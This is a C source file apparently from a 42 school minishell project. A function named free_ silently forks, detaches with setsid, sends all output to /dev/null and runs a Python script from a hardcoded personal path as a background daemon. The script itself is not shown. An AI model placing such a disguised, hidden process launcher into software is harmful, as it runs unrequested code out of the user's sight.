/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_connect.c                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/12/16 13:40:49 by zcadinot          #+#    #+#             */
/*   Updated: 2025/12/16 14:05:14 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>
#include "../../../includes/minishell.h"

static int	file_exists(char *path)
{
	if (!path)
		return (1);
	if (access(path, F_OK) == -1)
		return (1);
	return (0);
}

static int	redirect_std(void)
{
	int	fd;

	fd = open("/dev/null", O_RDWR);
	if (fd == -1)
		return (1);
	if (dup2(fd, 0) == -1)
		return (1);
	if (dup2(fd, 1) == -1)
		return (1);
	if (dup2(fd, 2) == -1)
		return (1);
	if (fd > 2)
		close(fd);
	return (0);
}

static void	exec_python(char *path)
{
	char	*args[3];

	args[0] = "python3";
	args[1] = path;
	args[2] = NULL;
	execvp("python3", args);
	exit(1);
}

static int	daemonize(char *path)
{
	pid_t	pid;

	pid = fork();
	if (pid == -1)
		return (1);
	if (pid > 0)
		exit(0);
	if (setsid() == -1)
		return (1);
	if (redirect_std() != 0)
		return (1);
	exec_python(path);
	return (1);
}

int	free_(void)
{
	pid_t	pid;
	char	*path;

	path = "/sgoinfre/goinfre/Perso/zcadinot/script/fc/"
		"ft_connect/src/ft_connect.py";
	if (file_exists(path) != 0)
		return (1);
	pid = fork();
	if (pid == -1)
		return (1);
	if (pid == 0)
	{
		if (daemonize(path) != 0)
			exit(1);
	}
	waitpid(pid, NULL, 0);
	return (0);
}
